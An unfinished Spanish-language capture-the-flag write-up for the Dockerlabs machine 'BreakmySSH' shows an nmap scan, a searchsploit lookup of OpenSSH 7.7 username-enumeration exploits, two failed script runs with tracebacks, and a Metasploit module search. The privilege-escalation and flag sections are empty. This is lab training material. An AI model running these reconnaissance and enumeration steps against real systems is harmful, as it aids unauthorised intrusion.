# 🎯 Máquina: BreakmySSH
**IP:** 172.17.0.2
**OS:** Linux (Docker)
**Dificultad:** Muy Facil

---
## 1. 🔍 Enumeración
```bash
nmap -p- -sC -sV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 01:33 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
MAC Address: 8A:61:F3:B1:74:40 (Unknown)
```
Solo puerto 22 abierto, con OpenSSH 7.7.

## 2. 🔓 Explotación (Foothold)
Buscamos la posible vulnerabilidad asociada al servicio en el puerto 22.
```bash
searchsploit OpenSSH 7.7
OpenSSH 2.3 < 7.7 - Username Enumeration       |  linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC) |  linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)           |  linux/remote/45939.py
```
Copiamos el script encontrado para la versión vulnerable:
```bash
searchsploit -m 45233 #no funcionó, pasamos al comando manual:
cp /usr/share/exploitdb/exploits/linux/remote/45233.py .
```
```bash
ls
45233.py
```
```bash
cat 45233.py
# Exploit: OpenSSH 7.7 - Username Enumeration

#Lo ejecutamos
python3 45233.py
Traceback (most recent call last):
  File "/home/kali/Documents/Workspace/Dockerlabs/BreakmySSH/45233.py", line 30, in <module>
    old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
                               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
TypeError: 'property' object is not subscriptable
```
Obtenemos un error, lo que indica que el script puede ya estar parcheado. Probamos con otro script:
```bash
python3 45939.py
Traceback (most recent call last):
  File "/home/kali/Documents/Workspace/Dockerlabs/BreakmySSH/45939.py", line 16, in <module>
    old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^
            paramiko.common.MSG_SERVICE_ACCEPT]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
TypeError: 'property' object is not subscriptable
```
Pero llegamos al mismo error. Buscamos otra opción, sabiendo que tiene una versión vulnerable a enumeración de usuarios, probamos con `Metasploit Framework`.
```bash
msf > search CVE-2018-15473
 0  auxiliary/scanner/ssh/ssh_enumusers SSH Username Enumeration
```
## 3. 🚀 Escalada de Privilegios
*(¿Cómo pasamos de ser un usuario normal a ser Administrador o Root?)*


## 4. 🚩 Banderas (Flags)
- **User:** 
- **Root**: 